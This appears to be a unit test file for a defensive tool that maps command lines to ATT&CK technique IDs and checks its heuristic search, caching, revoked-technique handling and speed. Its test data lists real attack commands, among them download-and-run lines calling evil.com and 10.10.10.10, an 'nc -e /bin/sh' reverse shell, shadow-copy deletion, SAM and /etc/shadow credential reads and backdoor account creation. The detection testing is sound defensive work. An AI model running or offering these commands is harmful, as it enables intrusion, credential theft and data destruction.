import unittest
import time
from bluekit.kb.query import KB

class TestPerf(unittest.TestCase):
    def setUp(self):
        self.kb = KB()

    def test_equivalence(self):
        texts = [
            'powershell.exe -w hidden -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.10.10/mal.ps1\')"',
            'cmd.exe /c "ping 127.0.0.1 -n 10 > nul"',
            'certutil.exe -urlcache -split -f http://evil.com/a.exe C:\\Temp\\a.exe',
            'vssadmin delete shadows /all /quiet',
            'whoami /all',
            'net localgroup administrators attacker /add',
            'schtasks /create /tn "MyTask" /tr "C:\\malware.exe" /sc onstart /ru SYSTEM',
            'wmic shadowcopy delete',
            'nltest /domain_trusts',
            'reg save HKLM\\SAM C:\\sam.save',
            'rundll32.exe C:\\malware.dll,EntryPoint',
            'bitsadmin /transfer myJob /download /priority normal http://evil.com/a.exe C:\\Temp\\a.exe',
            'curl -s http://evil.com/script.sh | bash',
            'wget -qO- http://evil.com/script.sh | sh',
            'cat /etc/shadow',
            'chmod +x /tmp/malware',
            'echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd',
            'crontab -e',
            'ssh user@10.10.10.10 -L 8080:localhost:80',
            'find / -name "*.conf"',
            'nc -e /bin/sh 10.10.10.10 4444'
        ]

        for t in texts:
            a = sorted({r['attack_id'] for r in self.kb.search(t) if r['sources'].get('heuristic', 0) > 0})
            b = sorted({r['attack_id'] for r in self.kb.search_heuristics(t)})
            self.assertEqual(a, b, f"farq: {t}")

    def test_cache_lazy_loading(self):
        self.assertIsNone(self.kb._heur_compiled)
        self.kb.search_heuristics("test")
        self.assertIsNotNone(self.kb._heur_compiled)
        first_id = id(self.kb._heur_compiled)
        self.kb.search_heuristics("test2")
        self.assertEqual(id(self.kb._heur_compiled), first_id)

    def test_revoked(self):
        # We manually inject a fake heuristic that maps to a known revoked technique if we want,
        # but the spec says "Agar bunday qoida yo'q bo'lsa, testni kb._tech_status orqali sun'iy holatda tekshiring"
        
        # Call once to populate cache
        self.kb.search_heuristics("dummy text")
        
        # Let's find an active technique to mock as revoked
        test_id = 'T1003'
        replacement_id = 'T1003.001'
        
        # Save original state
        orig_status = self.kb._tech_status.get(test_id)
        
        # Mock as revoked
        self.kb._tech_status[test_id] = (1, 0, replacement_id) # revoked=1, deprecated=0, revoked_by=replacement_id
        
        # Add a fake heuristic pattern that will trigger this tech
        import re
        self.kb._heur_compiled.append((re.compile('FAKE_REVOKED_PATTERN', re.I), [test_id], 'Fake Heuristic', 1.0))
        
        # Search
        res = self.kb.search_heuristics("This is a FAKE_REVOKED_PATTERN")
        ids = [r['attack_id'] for r in res]
        
        self.assertIn(replacement_id, ids)
        self.assertNotIn(test_id, ids)
        
        # Restore (though it's a test so it will be discarded anyway)
        if orig_status:
            self.kb._tech_status[test_id] = orig_status
        else:
            del self.kb._tech_status[test_id]

    def test_performance(self):
        # Soft performance limit check
        text = 'powershell.exe -w hidden -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.10.10/mal.ps1\')"'
        start = time.time()
        for _ in range(2000):
            self.kb.search_heuristics(text)
        duration = time.time() - start
        self.assertLess(duration, 10.0, f"Performance test failed, took {duration}s")

if __name__ == '__main__':
    unittest.main()
